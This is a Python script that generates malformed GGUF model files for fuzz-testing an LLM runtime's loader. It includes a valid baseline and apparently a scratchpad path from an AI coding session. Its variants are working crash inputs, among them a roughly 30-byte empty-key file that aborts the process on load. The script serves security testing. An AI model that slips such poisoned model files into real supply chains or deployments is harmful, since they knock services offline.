#!/usr/bin/env python3
"""Generate malformed GGUF files to test the model loader (the LLM03 entry point).

A GGUF file is what an LLM runtime parses before it runs anything. If a poisoned model
comes in through the supply chain, this parser is the first code that touches
attacker-controlled bytes, so it is where I look first.

Each file here targets one thing in the header/metadata/tensor-info parsing: an oversized
count, an oversized length, a dimension product that overflows, an out-of-range type, an
offset past the end of the file. I write a valid baseline too, so a clean run on the
baseline tells me the harness itself is fine.

Usage: python3 gen_gguf.py <out_dir>   (defaults to a scratch dir)
"""
import os
import struct
import sys

MAGIC = 0x46554747  # "GGUF"
VERSION = 3

# GGUF metadata value types
T_UINT32, T_STRING, T_ARRAY, T_UINT64 = 4, 8, 9, 10
U64_MAX = 0xFFFFFFFFFFFFFFFF


def u32(x): return struct.pack("<I", x & 0xFFFFFFFF)
def u64(x): return struct.pack("<Q", x & U64_MAX)
def gstr(b):
    if isinstance(b, str): b = b.encode()
    return u64(len(b)) + b


def kv_u32(key, val):
    return gstr(key) + u32(T_UINT32) + u32(val)

def kv_str(key, val):
    return gstr(key) + u32(T_STRING) + gstr(val)


def build(tensor_count, kv_count, kv_blob, tensor_blob, data=b"", version=VERSION,
          magic=MAGIC):
    """Assemble a GGUF from parts. Any part can be crafted by the caller."""
    hdr = u32(magic) + u32(version) + u64(tensor_count) + u64(kv_count)
    body = hdr + kv_blob + tensor_blob
    # pad to 32-byte alignment before the data section (matches default alignment)
    pad = (-len(body)) % 32
    return body + b"\x00" * pad + data


def tensor(name, dims, ttype, offset):
    b = gstr(name) + u32(len(dims))
    for d in dims:
        b += u64(d)
    b += u32(ttype) + u64(offset)
    return b


def baseline():
    """A minimal valid GGUF: one F32 tensor of 4 elements, two metadata keys."""
    kv = kv_u32("general.alignment", 32) + kv_str("general.architecture", "llama")
    t = tensor("t", [4], 0, 0)          # type 0 = GGML_TYPE_F32
    data = struct.pack("<4f", 1, 2, 3, 4)
    return build(1, 2, kv, t, data)


def variants():
    """Return {name: bytes}. Each targets one parser assumption."""
    v = {}
    v["00_baseline_valid"] = baseline()

    # oversized top-level counts: force the loader to trust a huge n before it reads n items
    kv = kv_u32("general.alignment", 32)
    v["01_huge_kv_count"]     = build(1, U64_MAX, kv, tensor("t", [4], 0, 0))
    v["02_huge_tensor_count"] = build(U64_MAX, 1, kv, tensor("t", [4], 0, 0))

    # oversized string length: the key claims far more bytes than the file holds
    bad_key = u64(U64_MAX) + b"x"        # length says 2^64-1, only 1 byte present
    v["03_huge_key_len"] = build(0, 1, bad_key + u32(T_UINT32) + u32(0), b"")

    # oversized array length in a metadata value
    arr = gstr("bad") + u32(T_ARRAY) + u32(T_UINT32) + u64(U64_MAX)
    v["04_huge_array_len"] = build(0, 1, arr, b"")

    # tensor with an absurd dimension count
    v["05_huge_n_dims"] = build(1, 1, kv,
        gstr("t") + u32(0xFFFFFFFF) + u32(0) + u64(0))

    # dimensions whose product overflows u64 (n_elements = prod(dims))
    big = 0x2000000000000000
    v["06_dim_product_overflow"] = build(1, 1, kv, tensor("t", [big, big, 4], 0, 0))

    # out-of-range metadata value type
    v["07_bad_value_type"] = build(0, 1, gstr("k") + u32(0xDEADBEEF), b"")

    # out-of-range tensor type enum (indexes a type-traits table)
    v["08_bad_tensor_type"] = build(1, 1, kv, tensor("t", [4], 0xDEADBEEF, 0))

    # tensor data offset far past the end of the file
    v["09_offset_past_eof"] = build(1, 1, kv, tensor("t", [4], 0, 0xFFFFFFFF00))

    # a single huge dimension (near-max), on its own
    v["10_single_huge_dim"] = build(1, 1, kv, tensor("t", [U64_MAX], 0, 0))

    # truncated: header promises a tensor + data, file ends early
    full = build(1, 1, kv, tensor("t", [1024], 0, 0), b"\x00" * 16)
    v["11_truncated"] = full[: len(full) - 3000 if len(full) > 3000 else len(full)//2]

    # wrong magic / version (should be rejected cleanly; sanity of error path)
    v["12_bad_version"] = build(1, 2, kv, tensor("t", [4], 0, 0), version=99)

    # empty metadata key -> reachable assertion DoS (gguf.cpp:143 GGML_ASSERT(!key.empty)).
    # Found by the fuzzing campaign; minimal hand-built reproducer. One KV whose key is the
    # empty string aborts the whole process on load. This is a ~30-byte poisoned model.
    empty_key = u64(0) + u32(T_UINT32) + u32(0)      # key len 0, type uint32, value 0
    v["13_empty_key_dos"] = build(0, 1, empty_key, b"")
    return v


def main():
    out = sys.argv[1] if len(sys.argv) > 1 else \
        "/tmp/claude-1000/-home-jynx-Documents/8bbcb67c-3b4c-40be-ad43-97363f0f8957/scratchpad/gguf_corpus"
    os.makedirs(out, exist_ok=True)
    for name, blob in variants().items():
        path = os.path.join(out, name + ".gguf")
        with open(path, "wb") as f:
            f.write(blob)
        print(f"{name:<26} {len(blob):>8} bytes")
    print(f"\nwrote {len(variants())} files to {out}")


if __name__ == "__main__":
    main()
